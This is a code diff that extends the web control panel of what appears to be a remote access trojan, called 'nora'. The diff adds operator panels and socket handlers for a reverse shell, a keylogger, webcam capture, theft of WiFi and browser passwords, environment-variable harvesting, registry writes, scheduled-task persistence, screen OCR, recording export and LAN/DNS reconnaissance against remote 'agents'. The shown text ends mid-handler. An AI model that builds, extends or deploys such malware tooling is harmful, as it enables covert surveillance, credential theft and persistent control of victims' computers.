@@ -220,6 +220,17 @@ body.light #scr-wrap{background:#e4e4e7}
   :root{--sidebar:0px}
   #sidebar{display:none}
 }
+/* ── Shell terminal ──────────────────────────────────────── */
+#sh-out{flex:1;overflow-y:auto;background:#0a0a0a;color:#33ff33;font-family:"JetBrains Mono","Courier New",monospace;font-size:.78rem;padding:10px 14px;white-space:pre-wrap;word-break:break-all}
+/* ── Generic table ───────────────────────────────────────── */
+.gtbl{width:100%;border-collapse:collapse;font-size:.8rem}
+.gtbl th{text-align:left;padding:7px 14px;background:var(--surface2);color:var(--text3);font-size:.68rem;text-transform:uppercase;letter-spacing:.08em;border-bottom:1px solid var(--border);position:sticky;top:0}
+.gtbl td{padding:7px 14px;border-bottom:1px solid var(--border);word-break:break-all}
+.gtbl tr:hover td{background:var(--surface2)}
+/* ── Inlined inputs ──────────────────────────────────────── */
+.ipt{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:6px 12px;font-size:.82rem;outline:none}
+.ipt:focus{border-color:var(--accent)}
+.isel{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:7px;padding:5px 8px;font-size:.78rem;outline:none}
 </style>
 </head>
 <body>
@@ -265,6 +276,31 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="vol"><span class="ico">&#x1F50A;</span><span>Volume</span></button>
     <button class="nav-btn" data-p="mons"><span class="ico">&#x1F5B5;</span><span>Monitors</span></button>
     <button class="nav-btn" data-p="notes"><span class="ico">&#x1F4DD;</span><span>Notes</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">Control</div>
+    <button class="nav-btn" data-p="power"><span class="ico">&#x26A1;</span><span>Power</span></button>
+    <button class="nav-btn" data-p="rshell"><span class="ico">&#x1F5A5;</span><span>Shell</span></button>
+    <button class="nav-btn" data-p="webcam2"><span class="ico">&#x1F4F7;</span><span>Webcam Snap</span></button>
+    <button class="nav-btn" data-p="winactive"><span class="ico">&#x1FA9F;</span><span>Active Win</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">Secrets</div>
+    <button class="nav-btn" data-p="wifi"><span class="ico">&#x1F4F6;</span><span>WiFi Passwords</span></button>
+    <button class="nav-btn" data-p="bpwd"><span class="ico">&#x1F511;</span><span>Browser Pwds</span></button>
+    <button class="nav-btn" data-p="envvars"><span class="ico">&#x1F30D;</span><span>Env Vars</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">Recon</div>
+    <button class="nav-btn" data-p="drives"><span class="ico">&#x1F4BE;</span><span>Drives</span></button>
+    <button class="nav-btn" data-p="fsearch"><span class="ico">&#x1F50D;</span><span>File Search</span></button>
+    <button class="nav-btn" data-p="evtlog"><span class="ico">&#x1F4CB;</span><span>Event Logs</span></button>
+    <button class="nav-btn" data-p="registry"><span class="ico">&#x1F5DD;</span><span>Registry</span></button>
+    <button class="nav-btn" data-p="users"><span class="ico">&#x1F464;</span><span>Users</span></button>
+    <button class="nav-btn" data-p="tasks"><span class="ico">&#x23F0;</span><span>Sched Tasks</span></button>
+    <button class="nav-btn" data-p="ocr"><span class="ico">&#x1F441;</span><span>OCR</span></button>
+    <button class="nav-btn" data-p="lanscan"><span class="ico">&#x1F4E1;</span><span>LAN Scan</span></button>
+    <button class="nav-btn" data-p="dnscache"><span class="ico">&#x1F310;</span><span>DNS Cache</span></button>
   </div>
 </nav>
 
@@ -319,8 +355,10 @@ body.light #scr-wrap{background:#e4e4e7}
   <div class="panel" id="kl">
     <div class="ph"><h2>Keylogs</h2><span class="meta" id="kl-n">0 keys</span></div>
     <div id="kl-bar">
-      <button class="act-btn danger" id="kl-clear">Clear</button>
-      <a class="act-btn primary" id="kl-export" href="#" target="_blank">Export Report</a>
+      <button class="act-btn primary" id="kl-on">Start</button>
+      <button class="act-btn danger" id="kl-off">Stop</button>
+      <button class="act-btn" id="kl-clear">Clear</button>
+      <a class="act-btn" id="kl-export" href="#" target="_blank">Export</a>
     </div>
     <div id="kl-feed"></div>
   </div>
@@ -491,6 +529,220 @@ body.light #scr-wrap{background:#e4e4e7}
       <input id="notes-label" type="text" placeholder="e.g. Office PC, Home Laptop..." style="background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:8px 12px;font-size:.85rem;outline:none">
       <label style="font-size:.78rem;color:var(--text2)">Notes</label>
       <textarea id="notes-ta" rows="10" placeholder="Write your notes about this agent here..." style="flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px 12px;font-size:.85rem;outline:none;resize:vertical;min-height:200px;font-family:inherit"></textarea>
+    </div>
+  </div>
+
+  <!-- POWER -->
+  <div class="panel" id="power">
+    <div class="ph"><h2>&#x26A1; Power</h2></div>
+    <div class="pbody" style="display:flex;flex-direction:column;align-items:center;gap:16px;justify-content:center;max-width:400px">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%">
+        <button class="act-btn danger" id="pw-shutdown" style="padding:18px;font-size:1rem">&#x1F534; Shutdown</button>
+        <button class="act-btn danger" id="pw-restart" style="padding:18px;font-size:1rem">&#x1F501; Restart</button>
+        <button class="act-btn" id="pw-sleep" style="padding:18px;font-size:1rem">&#x1F4A4; Sleep</button>
+        <button class="act-btn" id="pw-lock" style="padding:18px;font-size:1rem">&#x1F512; Lock</button>
+        <button class="act-btn" id="pw-logoff" style="padding:18px;font-size:1rem">&#x1F6AA; Log Off</button>
+        <button class="act-btn" id="pw-mon-off" style="padding:18px;font-size:1rem">&#x1F4FA; Monitor Off</button>
+      </div>
+      <div id="pw-status" style="color:var(--text3);font-size:.82rem"></div>
+    </div>
+  </div>
+
+  <!-- REVERSE SHELL -->
+  <div class="panel" id="rshell">
+    <div class="ph"><h2>&gt;_ Shell</h2>
+      <select class="isel" id="sh-sel"><option value="cmd.exe">cmd.exe</option><option value="powershell.exe">powershell.exe</option></select>
+      <button class="act-btn primary" id="sh-start">Start</button>
+      <button class="act-btn danger" id="sh-stop">Stop</button>
+    </div>
+    <div id="sh-out"></div>
+    <div style="display:flex;gap:8px;padding:8px 14px;background:var(--surface);border-top:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="sh-in" type="text" placeholder="Type command and press Enter..." style="flex:1">
+      <button class="act-btn primary" id="sh-send">Send</button>
+    </div>
+  </div>
+
+  <!-- WEBCAM SNAPSHOT -->
+  <div class="panel" id="webcam2">
+    <div class="ph"><h2>&#x1F4F7; Webcam Snapshot</h2>
+      <select class="isel" id="wc-idx"><option value="0">Camera 0</option><option value="1">Camera 1</option></select>
+      <button class="act-btn primary" id="wc-snap">Capture</button>
+    </div>
+    <div class="pbody" style="display:flex;flex-direction:column;align-items:center;gap:12px">
+      <div id="wc-status" style="color:var(--text3)">Click Capture to take a snapshot</div>
+      <img id="wc-img" src="" style="max-width:100%;max-height:60vh;border-radius:var(--radius);border:1px solid var(--border);display:none">
+    </div>
+  </div>
+
+  <!-- ACTIVE WINDOW -->
+  <div class="panel" id="winactive">
+    <div class="ph"><h2>&#x1FA9F; Active Window</h2><button class="act-btn primary" id="wa-get">Refresh</button></div>
+    <div class="pbody" style="max-width:600px">
+      <div id="wa-info" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;font-size:.85rem;color:var(--text2)">Click Refresh to get active window info.</div>
+    </div>
+  </div>
+
+  <!-- WIFI PASSWORDS -->
+  <div class="panel" id="wifi">
+    <div class="ph"><h2>&#x1F4F6; WiFi Passwords</h2><button class="act-btn primary" id="wifi-fetch">Fetch</button></div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl" id="wifi-tbl">
+        <thead><tr><th>SSID</th><th>Password</th><th>Auth</th></tr></thead>
+        <tbody id="wifi-body"><tr><td colspan="3" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- BROWSER PASSWORDS -->
+  <div class="panel" id="bpwd">
+    <div class="ph"><h2>&#x1F511; Browser Passwords</h2><button class="act-btn primary" id="bpwd-fetch">Fetch</button><span class="meta" id="bpwd-n">--</span></div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="bpwd-q" type="text" placeholder="Filter by URL or username..." style="width:100%">
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl" id="bpwd-tbl">
+        <thead><tr><th>Browser</th><th>URL</th><th>Username</th><th>Password</th></tr></thead>
+        <tbody id="bpwd-body"><tr><td colspan="4" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ENV VARS -->
+  <div class="panel" id="envvars">
+    <div class="ph"><h2>&#x1F30D; Environment Variables</h2><button class="act-btn primary" id="env-fetch">Fetch</button></div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="env-q" type="text" placeholder="Filter..." style="width:100%">
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Name</th><th>Value</th></tr></thead>
+        <tbody id="env-body"><tr><td colspan="2" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- DRIVES -->
+  <div class="panel" id="drives">
+    <div class="ph"><h2>&#x1F4BE; Drives</h2><button class="act-btn primary" id="drv-fetch">Fetch</button></div>
+    <div class="pbody"><div class="si-grid" id="drv-grid"><div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px">Click Fetch</div></div></div>
+  </div>
+
+  <!-- FILE SEARCH -->
+  <div class="panel" id="fsearch">
+    <div class="ph"><h2>&#x1F50D; File Search</h2></div>
+    <div style="padding:10px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0">
+      <input class="ipt" id="fs-root" type="text" value="C:\\" placeholder="Root path..." style="width:160px;font-family:monospace">
+      <input class="ipt" id="fs-pat" type="text" placeholder="Pattern e.g. *.pdf" style="flex:1">
+      <button class="act-btn primary" id="fs-go">Search</button>
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Path</th><th>Size</th></tr></thead>
+        <tbody id="fs-body"><tr><td colspan="2" style="text-align:center;color:var(--text3);padding:40px">Enter root &amp; pattern, then click Search</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- EVENT LOGS -->
+  <div class="panel" id="evtlog">
+    <div class="ph"><h2>&#x1F4CB; Event Logs</h2>
+      <select class="isel" id="evt-log"><option>System</option><option>Application</option><option>Security</option></select>
+      <select class="isel" id="evt-lvl"><option value="">All</option><option value="Error">Error</option><option value="Warning">Warning</option><option value="Information">Information</option></select>
+      <input class="ipt" id="evt-cnt" type="number" value="50" min="1" max="500" style="width:60px">
+      <button class="act-btn primary" id="evt-fetch">Fetch</button>
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Time</th><th>Level</th><th>Source</th><th>Message</th></tr></thead>
+        <tbody id="evt-body"><tr><td colspan="4" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- REGISTRY -->
+  <div class="panel" id="registry">
+    <div class="ph"><h2>&#x1F5DD; Registry</h2></div>
+    <div class="pbody" style="max-width:600px;display:flex;flex-direction:column;gap:10px">
+      <div style="font-size:.78rem;color:var(--text2)">Read a value</div>
+      <div style="display:flex;gap:8px">
+        <input class="ipt" id="reg-r-key" type="text" placeholder="HKLM\SOFTWARE\..." style="flex:1;font-family:monospace;font-size:.78rem">
+        <input class="ipt" id="reg-r-val" type="text" placeholder="Value name" style="width:140px">
+        <button class="act-btn primary" id="reg-get">Get</button>
+      </div>
+      <div id="reg-result" style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:.78rem;color:var(--text2);min-height:36px"></div>
+      <div style="font-size:.78rem;color:var(--text2);margin-top:8px">Write a value</div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <input class="ipt" id="reg-w-key" type="text" placeholder="Key path" style="flex:2;min-width:180px;font-family:monospace;font-size:.78rem">
+        <input class="ipt" id="reg-w-val" type="text" placeholder="Value name" style="flex:1;min-width:120px">
+        <input class="ipt" id="reg-w-data" type="text" placeholder="Data" style="flex:1;min-width:120px">
+        <select class="isel" id="reg-w-type"><option>REG_SZ</option><option>REG_DWORD</option><option>REG_EXPAND_SZ</option></select>
+        <button class="act-btn primary" id="reg-set">Set</button>
+      </div>
+      <div id="reg-set-result" style="color:var(--text3);font-size:.78rem"></div>
+    </div>
+  </div>
+
+  <!-- USERS -->
+  <div class="panel" id="users">
+    <div class="ph"><h2>&#x1F464; User Accounts</h2><button class="act-btn primary" id="usr-fetch">Fetch</button></div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Name</th><th>Full Name</th><th>Enabled</th><th>Groups</th></tr></thead>
+        <tbody id="usr-body"><tr><td colspan="4" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- SCHEDULED TASKS -->
+  <div class="panel" id="tasks">
+    <div class="ph"><h2>&#x23F0; Scheduled Tasks</h2><button class="act-btn primary" id="tsk-fetch">Fetch</button></div>
+    <div style="padding:10px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;flex-shrink:0;align-items:center">
+      <span style="color:var(--text3);font-size:.75rem">Create:</span>
+      <input class="ipt" id="tsk-n" placeholder="Task name" style="width:130px">
+      <input class="ipt" id="tsk-cmd" placeholder="Command" style="flex:1;min-width:160px">
+      <input class="ipt" id="tsk-sched" placeholder="Schedule e.g. DAILY" style="width:130px">
+      <input class="ipt" id="tsk-time" placeholder="Time 06:00" style="width:90px">
+      <button class="act-btn primary" id="tsk-create">Create</button>
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Name</th><th>Status</th><th>Next Run</th><th>Last Run</th><th></th></tr></thead>
+        <tbody id="tsk-body"><tr><td colspan="5" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- OCR -->
+  <div class="panel" id="ocr">
+    <div class="ph"><h2>&#x1F441; OCR Screenshot</h2><button class="act-btn primary" id="ocr-run">Capture &amp; OCR</button></div>
+    <div class="pbody" style="display:flex;flex-direction:column;gap:12px">
+      <div id="ocr-status" style="color:var(--text3)">Click to capture screen and extract text via OCR.</div>
+      <textarea id="ocr-out" rows="16" readonly style="background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px 12px;font-family:monospace;font-size:.8rem;resize:vertical;outline:none;width:100%"></textarea>
+    </div>
+  </div>
+
+  <!-- LAN SCAN -->
+  <div class="panel" id="lanscan">
+    <div class="ph"><h2>&#x1F4E1; LAN Scan</h2><button class="act-btn primary" id="lan-scan">Scan</button></div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>IP</th><th>MAC</th><th>Interface</th></tr></thead>
+        <tbody id="lan-body"><tr><td colspan="3" style="text-align:center;color:var(--text3);padding:40px">Click Scan</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- DNS CACHE -->
+  <div class="panel" id="dnscache">
+    <div class="ph"><h2>&#x1F310; DNS Cache</h2><button class="act-btn primary" id="dns-fetch">Fetch</button></div>
+    <div style="padding:8px 20px;border-bottom:1px solid var(--border);flex-shrink:0">
+      <input class="ipt" id="dns-q" type="text" placeholder="Filter by name or IP..." style="width:100%">
+    </div>
+    <div style="flex:1;overflow-y:auto">
+      <table class="gtbl">
+        <thead><tr><th>Name</th><th>IP Address</th></tr></thead>
+        <tbody id="dns-body"><tr><td colspan="2" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
+      </table>
     </div>
   </div>
 
@@ -689,9 +941,16 @@ socket.on("import_result",d=>{$("cookie-status").textContent=d.ok?"Import done: 
 /* ── Recording ───────────────────────────────────────────── */
 let _rec=false;
 $("rec-tog").addEventListener("click",function(){
-  if(!agent)return;_rec=!_rec;socket.emit("command",{action:_rec?"start_recording":"stop_recording",_target:agent});
+  if(!agent)return;_rec=!_rec;
+  socket.emit(_rec?"start_recording":"stop_recording",{_target:agent});
   $("rec-orb").classList.toggle("on",_rec);this.textContent=_rec?"Stop Recording":"Start Recording";this.classList.toggle("on",_rec);
   $("rec-lbl").textContent=_rec?"Recording...":"Not recording";
+});
+socket.on("recording_started",d=>{if(d.ok)toast("Recording started","ok");else{toast("Failed: "+(d.error||"?"),"err");_rec=false;$("rec-orb").classList.remove("on");$("rec-tog").textContent="Start Recording";$("rec-lbl").textContent="Not recording"}});
+socket.on("recording_result",d=>{
+  _rec=false;$("rec-orb").classList.remove("on");$("rec-tog").textContent="Start Recording";$("rec-lbl").textContent="Not recording";
+  if(d.error){toast("Recording error: "+d.error,"err");return}
+  if(d.data){const b=Uint8Array.from(atob(d.data),c=>c.charCodeAt(0));const blob=new Blob([b],{type:"video/mp4"});const a=Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:(agent||"recording")+"_"+Date.now()+".mp4"});a.click();URL.revokeObjectURL(a.href);toast("Recording saved","ok")}
 });
 
 /* ── System Info ─────────────────────────────────────────── */
@@ -844,6 +1103,188 @@ function _nk(){return"nora_notes_"+agent}
 function _loadNotes(){try{const d=JSON.parse(localStorage.getItem(_nk())||"{}");$("notes-label").value=d.label||"";$("notes-ta").value=d.notes||""}catch{}}
 $("notes-save").addEventListener("click",()=>{if(!agent)return;try{localStorage.setItem(_nk(),JSON.stringify({label:$("notes-label").value,notes:$("notes-ta").value}))}catch{}toast("Notes saved","ok")});
 $("agent-sel").addEventListener("change",_loadNotes);
+
+/* ── Keylog start/stop ───────────────────────────────────── */
+$("kl-on").addEventListener("click",()=>{if(!agent)return;socket.emit("keylog_on",{_target:agent});toast("Keylogger starting…")});
+$("kl-off").addEventListener("click",()=>{if(!agent)return;socket.emit("keylog_off",{_target:agent});toast("Keylogger stopped")});
+socket.on("keylog_status",d=>{toast("Keylogger "+(d.running?"running":"stopped"),d.running?"ok":"")});
+
+/* ── Power ───────────────────────────────────────────────── */
+["shutdown","restart","sleep","lock","logoff","mon-off"].forEach(a=>{
+  $("pw-"+a).addEventListener("click",()=>{
+    if(!agent)return;
+    if(["shutdown","restart"].includes(a)&&!confirm("Send "+a+" to remote?"))return;
+    socket.emit("power_action",{action:a,_target:agent});$("pw-status").textContent="Sent: "+a;
+  });
+});
+socket.on("power_result",d=>$("pw-status").textContent=d.ok?"Done.":"Error: "+(d.error||"?"));
+
+/* ── Reverse Shell ───────────────────────────────────────── */
+let _shRunning=false;
+$("sh-start").addEventListener("click",()=>{
+  if(!agent)return;if(_shRunning)return;
+  socket.emit("shell_start",{shell:$("sh-sel").value,_target:agent});
+  _shRunning=true;$("sh-out").textContent="";
+});
+$("sh-stop").addEventListener("click",()=>{if(!agent)return;socket.emit("shell_stop",{_target:agent})});
+$("sh-send").addEventListener("click",()=>{
+  const t=$("sh-in").value;if(!t||!agent)return;
+  socket.emit("shell_input",{data:t+"\n",_target:agent});
+  $("sh-out").textContent+="$ "+t+"\n";$("sh-in").value="";$("sh-out").scrollTop=$("sh-out").scrollHeight;
+});
+$("sh-in").addEventListener("keydown",e=>{if(e.key==="Enter")$("sh-send").click()});
+socket.on("shell_started",d=>{if(!d.ok){toast("Shell failed: "+(d.error||"?"),"err");_shRunning=false}else{toast("Shell started","ok")}});
+socket.on("shell_output",d=>{
+  const el=$("sh-out");if(d.closed){_shRunning=false;el.textContent+="[session closed]\n"}else{el.textContent+=d.data||""}
+  el.scrollTop=el.scrollHeight;
+});
+
+/* ── Webcam Snapshot ─────────────────────────────────────── */
+$("wc-snap").addEventListener("click",()=>{
+  if(!agent)return;$("wc-status").textContent="Capturing...";$("wc-img").style.display="none";
+  socket.emit("webcam_snapshot",{index:parseInt($("wc-idx").value),_target:agent});
+});
+socket.on("webcam_snapshot_result",d=>{
+  if(d.error){$("wc-status").textContent="Error: "+d.error;return}
+  $("wc-status").textContent="Captured. Click to download.";
+  const img=$("wc-img");img.src="data:image/jpeg;base64,"+d.data;img.style.display="block";
+  img.onclick=()=>{const a=Object.assign(document.createElement("a"),{href:img.src,download:(agent||"webcam")+"_"+Date.now()+".jpg"});a.click()};
+});
+
+/* ── Active Window ───────────────────────────────────────── */
+$("wa-get").addEventListener("click",()=>{if(!agent)return;$("wa-info").textContent="Loading...";socket.emit("get_active_window",{_target:agent})});
+socket.on("active_window_result",d=>{
+  if(d.error){$("wa-info").textContent="Error: "+d.error;return}
+  $("wa-info").innerHTML=`<b>Title:</b> ${esc(d.title||"?")}<br><b>Process:</b> ${esc(d.process||"?")} (PID: ${d.pid||"?"})<br><b>Executable:</b> ${esc(d.exe||"?")}`;
+});
+
+/* ── WiFi Passwords ──────────────────────────────────────── */
+$("wifi-fetch").addEventListener("click",()=>{if(!agent)return;$("wifi-body").innerHTML='<tr><td colspan="3" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';socket.emit("get_wifi_passwords",{_target:agent})});
+socket.on("wifi_passwords_result",d=>{
+  if(d.error){$("wifi-body").innerHTML=`<tr><td colspan="3" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  const rows=(d.passwords||[]).map(w=>`<tr><td>${esc(w.ssid)}</td><td><code>${esc(w.password||"(none)")}</code></td><td>${esc(w.auth||"")}</td></tr>`).join("");
+  $("wifi-body").innerHTML=rows||'<tr><td colspan="3" style="text-align:center;color:var(--text3);padding:30px">No WiFi profiles found</td></tr>';
+});
+
+/* ── Browser Passwords ───────────────────────────────────── */
+let _bpwd=[];
+$("bpwd-fetch").addEventListener("click",()=>{if(!agent)return;$("bpwd-body").innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">Loading…</td></tr>';socket.emit("get_browser_passwords",{_target:agent})});
+socket.on("browser_passwords_result",d=>{
+  if(d.error){$("bpwd-body").innerHTML=`<tr><td colspan="4" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  _bpwd=d.passwords||[];$("bpwd-n").textContent=_bpwd.length+" entries";renderBpwd();
+});
+$("bpwd-q").addEventListener("input",renderBpwd);
+function renderBpwd(){
+  const q=$("bpwd-q").value.toLowerCase();
+  const list=q?_bpwd.filter(p=>(p.url||"").toLowerCase().includes(q)||(p.username||"").toLowerCase().includes(q)):_bpwd;
+  $("bpwd-body").innerHTML=list.map(p=>`<tr><td>${esc(p.browser)}</td><td style="font-family:monospace;font-size:.75rem;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(p.url)}</td><td>${esc(p.username)}</td><td><code>${esc(p.password)}</code></td></tr>`).join("")||'<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">No results</td></tr>';
+}
+
+/* ── Env Vars ────────────────────────────────────────────── */
+let _env=[];
+$("env-fetch").addEventListener("click",()=>{if(!agent)return;$("env-body").innerHTML='<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';socket.emit("get_env_vars",{_target:agent})});
+socket.on("env_vars_result",d=>{
+  if(d.error){$("env-body").innerHTML=`<tr><td colspan="2" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  _env=Object.entries(d.vars||{});renderEnv();
+});
+$("env-q").addEventListener("input",renderEnv);
+function renderEnv(){
+  const q=$("env-q").value.toLowerCase();
+  const list=q?_env.filter(([k,v])=>k.toLowerCase().includes(q)||v.toLowerCase().includes(q)):_env;
+  $("env-body").innerHTML=list.map(([k,v])=>`<tr><td style="font-weight:600;color:var(--accent2)">${esc(k)}</td><td style="font-family:monospace;font-size:.75rem;word-break:break-all">${esc(v)}</td></tr>`).join("")||'<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">No results</td></tr>';
+}
+
+/* ── Drives ──────────────────────────────────────────────── */
+$("drv-fetch").addEventListener("click",()=>{if(!agent)return;$("drv-grid").innerHTML='<div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px">Loading...</div>';socket.emit("get_drives",{_target:agent})});
+socket.on("drives_result",d=>{
+  if(d.error){$("drv-grid").innerHTML=`<div style="color:var(--red);grid-column:1/-1;text-align:center;padding:40px">${esc(d.error)}</div>`;return}
+  const g=$("drv-grid");g.innerHTML="";
+  (d.drives||[]).forEach(dr=>{
+    const pct=dr.total>0?Math.round(dr.used/dr.total*100):0;const c=pct>85?"var(--red)":pct>60?"var(--yellow)":"var(--green)";
+    g.insertAdjacentHTML("beforeend",`<div class="si-card"><div class="label">${esc(dr.drive)} — ${esc(dr.type||"")}</div><div class="val">${fmtB(dr.free)} free</div><div class="sub">${fmtB(dr.used)} / ${fmtB(dr.total)}</div><div class="si-bar"><div class="si-bar-fill" style="width:${pct}%;background:${c}"></div></div></div>`);
+  });
+  if(!(d.drives||[]).length)g.innerHTML='<div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px">No drives found</div>';
+});
+
+/* ── File Search ─────────────────────────────────────────── */
+$("fs-go").addEventListener("click",()=>{
+  if(!agent)return;$("fs-body").innerHTML='<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">Searching...</td></tr>';
+  socket.emit("search_files",{root:$("fs-root").value,pattern:$("fs-pat").value,_target:agent});
+});
+socket.on("search_files_result",d=>{
+  if(d.error){$("fs-body").innerHTML=`<tr><td colspan="2" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  $("fs-body").innerHTML=(d.files||[]).map(f=>`<tr><td style="font-family:monospace;font-size:.75rem">${esc(f.path)}</td><td style="white-space:nowrap">${fmtB(f.size||0)}</td></tr>`).join("")||'<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">No files found</td></tr>';
+});
+
+/* ── Event Logs ──────────────────────────────────────────── */
+$("evt-fetch").addEventListener("click",()=>{
+  if(!agent)return;$("evt-body").innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';
+  socket.emit("get_event_logs",{log:$("evt-log").value,level:$("evt-lvl").value,count:parseInt($("evt-cnt").value)||50,_target:agent});
+});
+socket.on("event_logs_result",d=>{
+  if(d.error){$("evt-body").innerHTML=`<tr><td colspan="4" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  $("evt-body").innerHTML=(d.events||[]).map(e=>{
+    const c=e.level==="Error"?"var(--red)":e.level==="Warning"?"var(--yellow)":"var(--text3)";
+    return`<tr><td style="white-space:nowrap;font-size:.72rem">${esc(e.time||"")}</td><td style="color:${c};font-weight:600">${esc(e.level||"")}</td><td style="font-size:.72rem">${esc(e.source||"")}</td><td style="font-size:.75rem">${esc((e.message||"").slice(0,200))}</td></tr>`;
+  }).join("")||'<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">No events</td></tr>';
+});
+
+/* ── Registry ────────────────────────────────────────────── */
+$("reg-get").addEventListener("click",()=>{
+  if(!agent)return;$("reg-result").textContent="Loading...";
+  socket.emit("registry_get",{key:$("reg-r-key").value,value_name:$("reg-r-val").value,_target:agent});
+});
+socket.on("registry_get_result",d=>{$("reg-result").textContent=d.error?"Error: "+d.error:(d.value!==undefined?JSON.stringify(d.value):"(empty)")});
+$("reg-set").addEventListener("click",()=>{
+  if(!agent)return;$("reg-set-result").textContent="Setting...";
+  socket.emit("registry_set",{key:$("reg-w-key").value,value_name:$("reg-w-val").value,data:$("reg-w-data").value,reg_type:$("reg-w-type").value,_target:agent});
+});
+socket.on("registry_set_result",d=>{$("reg-set-result").textContent=d.ok?"Saved!":"Error: "+(d.error||"?")});
+
+/* ── Users ───────────────────────────────────────────────── */
+$("usr-fetch").addEventListener("click",()=>{if(!agent)return;$("usr-body").innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';socket.emit("get_users",{_target:agent})});
+socket.on("users_result",d=>{
+  if(d.error){$("usr-body").innerHTML=`<tr><td colspan="4" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  $("usr-body").innerHTML=(d.users||[]).map(u=>`<tr><td style="font-weight:600">${esc(u.name)}</td><td>${esc(u.full_name||"")}</td><td style="color:${u.enabled?"var(--green)":"var(--red)"}">${u.enabled?"Yes":"No"}</td><td style="font-size:.72rem">${esc((u.groups||[]).join(", "))}</td></tr>`).join("")||'<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:30px">No users found</td></tr>';
+});
+
+/* ── Scheduled Tasks ─────────────────────────────────────── */
+$("tsk-fetch").addEventListener("click",()=>{if(!agent)return;$("tsk-body").innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';socket.emit("get_scheduled_tasks",{_target:agent})});
+socket.on("scheduled_tasks_result",d=>{
+  if(d.error){$("tsk-body").innerHTML=`<tr><td colspan="5" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
